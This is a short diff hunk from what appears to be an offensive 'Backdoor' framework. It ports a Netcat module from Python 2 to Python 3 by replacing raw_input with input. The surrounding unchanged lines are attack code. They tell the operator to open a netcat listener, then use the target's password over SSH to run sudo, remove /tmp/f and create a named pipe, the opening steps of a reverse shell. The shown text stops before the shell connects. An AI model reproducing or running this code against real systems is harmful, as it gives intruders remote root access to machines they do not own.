@@ -20,7 +20,7 @@ class Netcat(Backdoor):
     def do_exploit(self, args):
         port = self.get_value("port")
         target = self.core.curtarget
-        raw_input("Enter the following command in another terminal: nc -v -n -l -p %s" % port)
+        input("Enter the following command in another terminal: nc -v -n -l -p %s" % port)
         print(GOOD + "Initializing backdoor...")
         target.ssh.exec_command("echo " + target.pword + " | sudo -S rm /tmp/f")
         target.ssh.exec_command("echo " + target.pword + " | sudo -S mkfifo /tmp/f")
